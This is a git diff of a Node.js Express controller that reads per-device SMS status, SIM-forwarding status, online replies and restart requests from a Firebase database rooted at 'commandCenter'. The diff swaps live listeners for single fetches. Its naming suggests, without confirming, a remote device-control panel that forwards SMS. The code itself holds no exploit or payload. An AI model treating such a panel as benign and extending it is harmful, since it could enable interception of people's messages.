@@ -3,182 +3,34 @@ import { rtdb } from "../config/db.js";
 const ROOT = "commandCenter";
 
 /* ============================================================
-   🔁 GLOBAL WATCHERS (LIVE LISTENERS)
-   - Map me RTDB ref store karenge taki duplicate listener na bane
-============================================================ */
-const smsWatchers = new Map();          // uid -> rtdb ref
-const simForwardWatchers = new Map();   // uid -> rtdb ref
-
-/* ====================== HELPERS ======================= */
-
-const clean = (id) => id?.toString()?.trim();
-
-/** SMS list banana (sorted) */
-function buildSmsStatusList(uid, raw) {
-  if (!raw) return [];
-
-  const list = [];
-  Object.entries(raw).forEach(([smsId, obj]) => {
-    list.push({
-      smsId,
-      uid,
-      ...obj,
-    });
-  });
-
-  list.sort((a, b) => (b.at || 0) - (a.at || 0));
-  return list;
-}
-
-/** Sim forward list banana (sorted) */
-function buildSimForwardList(raw) {
-  if (!raw) return [];
-
-  const list = [];
-  Object.entries(raw).forEach(([simSlot, obj]) => {
-    list.push({
-      simSlot: Number(simSlot),
-      ...obj,
-    });
-  });
-
-  list.sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0));
-  return list;
-}
-
-/* ================== STOP WATCHERS =================== */
-
-function stopSmsWatcher(uid) {
-  const ref = smsWatchers.get(uid);
-  if (ref) {
-    ref.off();
-    smsWatchers.delete(uid);
-    console.log("🛑 SMS watcher stopped:", uid);
-  }
-}
-
-function stopSimForwardWatcher(uid) {
-  const ref = simForwardWatchers.get(uid);
-  if (ref) {
-    ref.off();
-    simForwardWatchers.delete(uid);
-    console.log("🛑 SIM-FORWARD watcher stopped:", uid);
-  }
-}
-
-/* ================== START WATCHERS =================== */
-
-function startSmsWatcher(uid, io) {
-  const path = `${ROOT}/smsStatus/${uid}`;
-  const ref = rtdb.ref(path);
-
-  ref.on("value", (snap) => {
-    if (!snap.exists()) {
-      console.log("⚪ LIVE SMS STATUS (empty):", uid);
-      if (io) {
-        io.emit("smsStatusUpdate", {
-          uid,
-          success: true,
-          data: [],
-          message: "No SMS status found",
-        });
-      }
-      return;
-    }
-
-    const raw = snap.val();
-    const list = buildSmsStatusList(uid, raw);
-
-    console.log("🔥 LIVE SMS STATUS:", uid, list);
-
-    if (io) {
-      io.emit("smsStatusUpdate", {
-        uid,
-        success: true,
-        data: list,
-      });
-    }
-  });
-
-  smsWatchers.set(uid, ref);
-  console.log("🎧 SMS watcher started:", uid);
-}
-
-function startSimForwardWatcher(uid, io) {
-  const path = `simForwardStatus/${uid}`;
-  const ref = rtdb.ref(path);
-
-  ref.on("value", (snap) => {
-    if (!snap.exists()) {
-      console.log("⚪ LIVE SIM-FORWARD (empty):", uid);
-      if (io) {
-        io.emit("simForwardUpdate", {
-          uid,
-          success: true,
-          data: [],
-          message: "No SIM forward status found",
-        });
-      }
-      return;
-    }
-
-    const raw = snap.val();
-    const list = buildSimForwardList(raw);
-
-    console.log("🔥 LIVE SIM-FORWARD STATUS:", uid, list);
-
-    if (io) {
-      io.emit("simForwardUpdate", {
-        uid,
-        success: true,
-        data: list,
-      });
-    }
-  });
-
-  simForwardWatchers.set(uid, ref);
-  console.log("🎧 SIM-FORWARD watcher started:", uid);
-}
-
-/* ============================================================
    ⭐ GET SMS STATUS OF ONE DEVICE — BY UID
    Path: /api/device/:uid/sms-status
-   ✔️ Ab LIVE listen + Socket.IO emit bhi karega
 ============================================================ */
 export const getSmsStatusByDevice = async (req, res) => {
   try {
-    const uidRaw = req.params.uid;
-    const uid = clean(uidRaw);
+    const { uid } = req.params;
 
-    if (!uid) {
-      return res.status(400).json({
-        success: false,
-        message: "uid missing / invalid",
-      });
-    }
-
-    const io = req.app.get("io"); // <-- Socket.IO instance
-
-    // Pehle purana watcher hatao (duplicate se bachne ke liye)
-    stopSmsWatcher(uid);
-
-    // 1) Current snapshot
     const snap = await rtdb.ref(`${ROOT}/smsStatus/${uid}`).get();
 
-    let list = [];
-    if (snap.exists()) {
-      list = buildSmsStatusList(uid, snap.val());
+    if (!snap.exists()) {
+      return res.json({ success: true, data: [] });
     }
 
-    // 2) Ab LIVE listener start karo
-    startSmsWatcher(uid, io);
+    const raw = snap.val();
+    const list = [];
 
-    // 3) Response
-    return res.json({
-      success: true,
-      data: list,
-      message: "SMS status live listening started",
+    Object.entries(raw).forEach(([smsId, obj]) => {
+      list.push({
+        smsId,
+        uid,
+        ...obj,
+      });
     });
+
+    list.sort((a, b) => b.at - a.at);
+
+    return res.json({ success: true, data: list });
+
   } catch (err) {
     console.error("❌ getSmsStatusByDevice ERROR:", err);
     res.status(500).json({ success: false, message: "Server error" });
@@ -189,42 +41,31 @@ export const getSmsStatusByDevice = async (req, res) => {
 /* ============================================================
    ⭐ GET SIM FORWARD STATUS — BY UID
    Path: /api/device/:uid/sim-forward
-   ✔️ Ab LIVE listen + Socket.IO emit bhi karega
 ============================================================ */
 export const getSimForwardStatus = async (req, res) => {
   try {
-    const uidRaw = req.params.uid;
-    const uid = clean(uidRaw);
+    const { uid } = req.params;
 
-    if (!uid) {
-      return res.status(400).json({
-        success: false,
-        message: "uid missing / invalid",
-      });
-    }
-
-    const io = req.app.get("io"); // <-- Socket.IO instance
-
-    // Purana watcher band karo
-    stopSimForwardWatcher(uid);
-
-    // 1) Current snapshot
     const snap = await rtdb.ref(`simForwardStatus/${uid}`).get();
 
-    let list = [];
-    if (snap.exists()) {
-      list = buildSimForwardList(snap.val());
+    if (!snap.exists()) {
+      return res.json({ success: true, data: [] });
     }
 
-    // 2) LIVE listener start
-    startSimForwardWatcher(uid, io);
+    const raw = snap.val();
+    const list = [];
 
-    // 3) Response
-    return res.json({
-      success: true,
-      data: list,
-      message: "SIM forward live listening started",
+    Object.entries(raw).forEach(([simSlot, obj]) => {
+      list.push({
+        simSlot: Number(simSlot),
+        ...obj,
+      });
     });
+
+    list.sort((a, b) => b.updatedAt - a.updatedAt);
+
+    return res.json({ success: true, data: list });
+
   } catch (err) {
     console.error("❌ getSimForwardStatus ERROR:", err);
     res.status(500).json({ success: false, message: "Server error" });
@@ -275,7 +116,6 @@ export const saveCheckOnlineStatus = async (req, res) => {
 /* ============================================================
    ⭐ GET DEVICE ONLINE REPLY — replyCollection/{uid}
    Path: /api/brosreply/:uid
-   (Ye abhi single fetch hi hai, live logic server.js me bhi hai)
 ============================================================ */
 export const getBrosReply = async (req, res) => {
   try {
@@ -294,7 +134,7 @@ export const getBrosReply = async (req, res) => {
       return res.json({
         success: true,
         data: null,
-        message: "No reply found",
+        message: "No reply found"
       });
     }
 
@@ -304,6 +144,7 @@ export const getBrosReply = async (req, res) => {
       success: true,
       data: { uid, ...data },
     });
+
   } catch (err) {
     console.error("❌ getBrosReply ERROR:", err);
     res.status(500).json({
@@ -312,6 +153,7 @@ export const getBrosReply = async (req, res) => {
     });
   }
 };
+
 
 
 /* ============================================================
@@ -342,6 +184,7 @@ export const setRestart = async (req, res) => {
       message: "Restart request saved",
       data: { uid, ...data },
     });
+
   } catch (err) {
     console.error("❌ setRestart ERROR:", err);
     return res.status(500).json({
@@ -350,6 +193,7 @@ export const setRestart = async (req, res) => {
     });
   }
 };
+
 
 
 /* ============================================================
@@ -373,7 +217,7 @@ export const getRestart = async (req, res) => {
       return res.json({
         success: true,
         data: null,
-        message: "No restart request found",
+        message: "No restart request found"
       });
     }
 
@@ -384,6 +228,7 @@ export const getRestart = async (req, res) => {
         ...snap.val(),
       },
     });
+
   } catch (err) {
     console.error("❌ getRestart ERROR:", err);
     return res.status(500).json({
